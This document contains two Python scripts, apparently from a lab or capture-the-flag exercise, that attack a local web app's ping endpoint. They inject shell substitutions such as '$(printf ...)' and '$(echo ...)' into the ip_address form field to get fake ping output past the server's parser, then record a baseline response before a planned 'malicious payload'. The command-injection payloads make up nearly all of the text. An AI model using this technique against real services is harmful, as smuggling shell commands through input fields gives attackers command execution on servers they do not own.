import requests
import urllib.parse

# Target configuration
target = "http://127.0.0.1:33052"
ping_endpoint = f"{target}/ping"

# Test different payload variations
test_payloads = [
    # Try printf instead of echo for better control
    '$(printf "100 packets transmitted, 100 received, 0%% packet loss")',
    # Try echo with escaped quotes
    "$(echo '100 packets transmitted, 100 received, 0% packet loss')",
    # Try without quotes
    "$(echo 100 packets transmitted, 100 received, 0% packet loss)",
    # Try verbatim fake ping output directly (just the string)
    "100 packets transmitted, 100 received, 0% packet loss",
]

for i, payload in enumerate(test_payloads):
    print(f"\n{'='*60}")
    print(f"[*] Test #{i+1}")
    print(f"[*] Payload: {payload}")
    print()
    
    data = {"ip_address": payload}
    response = requests.post(ping_endpoint, data=data, timeout=10)
    
    print(f"[+] Status: {response.status_code}")
    
    # Extract only the relevant content
    if "Failed to parse" in response.text:
        print("[+] Result: Parser error (regex still shows)")
        # Extract the error message
        import re
        match = re.search(r"Failed to parse ping output.*loss'", response.text)
        if match:
            print(f"[+] Error: {match.group()}")
    elif "Packets Transmitted" in response.text:
        print("[!!!] SUCCESS - Parser accepted the output!")
        # Extract the result
        import re
        match = re.search(r"Packets Transmitted: \d+, Packets Received: \d+, Packet Loss: \d+%", response.text)
        if match:
            print(f"[+] Parsed Result: {match.group()}")
    else:
        print(f"[+] Response: {response.text[:300]}...")
    
    print('='*60)
import requests
import urllib.parse
import re

# Target configuration
target = "http://127.0.0.1:33052"
ping_endpoint = f"{target}/ping"

# Let's first determine what the actual ping output looks like
# Testing with just an IP to see the normal output format
print("[*] Baseline: Testing normal ping to get output format")
data = {"ip_address": "127.0.0.1"}
response = requests.post(ping_endpoint, data=data, timeout=10)

# Extract the pre tag content
match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if match:
    print(f"[+] Normal ping output:")
    print(f"    {match.group(1)}")
else:
    # Check for parser error
    if "Failed to parse" in response.text:
        error_match = re.search(r'Failed to parse ping output[^<]*', response.text)
        if error_match:
            print(f"[+] Normal ping result: {error_match.group()}")
    else:
        print(f"[+] Response: {response.text[:400]}")

# Now test the malicious payload and extract the output
